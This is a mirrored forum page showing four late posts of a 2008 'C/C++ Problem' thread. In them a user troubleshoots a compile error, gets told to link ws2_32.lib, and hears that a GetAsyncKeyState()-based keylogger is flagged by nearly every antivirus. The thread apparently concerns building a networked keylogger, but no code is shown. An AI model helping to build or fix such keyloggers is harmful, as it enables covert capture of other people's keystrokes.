       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/bakatool.html'><span itemprop='name'>bakatool</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-04-29T14:09:54Z'>
            <time itemprop='dateModified' datetime='2016-07-30T22:12:47Z' class='post-time'>
              July 30, 2016, 10:12pm
            </time>
        <span itemprop='position'>#7</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>haha btw duplicate this guy is a scar coder and did some javascripts for RS2 including commands<br>
<a href="http://www.dreamincode.net/forums/showtopic23047.htm" class="onebox" target="_blank" rel="nofollow noopener">http://www.dreamincode.net/forums/showtopic23047.htm</a></p>
      </div>

      <meta itemprop='headline' content='C/C++ Problem'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>

          <div class='crawler-linkback-list' itemscope itemtype='http://schema.org/ItemList'>
          </div>

  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/Jellybean732.html'><span itemprop='name'>Jellybean732</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-04-29T20:17:00Z'>
            <time itemprop='dateModified' datetime='2016-07-30T22:12:53Z' class='post-time'>
              July 30, 2016, 10:12pm
            </time>
        <span itemprop='position'>#8</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>Now it says ‘close’ is undefined???</p>
      </div>

      <meta itemprop='headline' content='C/C++ Problem'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/Mopman.html'><span itemprop='name'>Mopman</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-04-29T22:19:13Z'>
            <time itemprop='dateModified' datetime='2016-07-30T22:12:54Z' class='post-time'>
              July 30, 2016, 10:12pm
            </time>
        <span itemprop='position'>#9</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>You should have used ws2_32.lib, I’m not sure if that is causing your error.</p>
<p>It actually says this in the comments at the top of the code, even, if you’d even skim read it.</p>
      </div>

      <meta itemprop='headline' content='C/C++ Problem'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/Sensored3.html'><span itemprop='name'>Sensored3</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-05-09T05:47:56Z'>
            <time itemprop='dateModified' datetime='2016-07-30T22:24:32Z' class='post-time'>
              July 30, 2016, 10:24pm
            </time>
        <span itemprop='position'>#10</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>By the way, such a GetAsyncKeyState() based keylogger is detected by nearly every kind of AV out there.</p>
      </div>

      <meta itemprop='headline' content='C/C++ Problem'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>


  </div>






    </div>
    <footer class="container wrap">
      <nav class='crawler-nav' itemscope itemtype='http://schema.org/SiteNavigationElement'>
        <ul>
        <li itemprop="name"><a href='../../index.html' itemprop="url">Home </a></li>
        <li itemprop="name"><a href='../../categories.html' itemprop="url">Categories </a></li>
        <li itemprop="name"><a href='../../guidelines.html' itemprop="url">FAQ/Guidelines </a></li>
        <li itemprop="name"><a href='../../tos.html' itemprop="url">Terms of Service </a></li>
        <li itemprop="name"><a href='../../privacy.html' itemprop="url">Privacy Policy </a></li>
        </ul>
      </nav>
      <p class='powered-by-link'>Powered by <a href="https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
    </footer>
    
  </body>
  

<!-- Mirrored from forum.moparisthebest.com/t/c-c-problem/202399 by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 05 Aug 2019 15:38:35 GMT -->
</html>
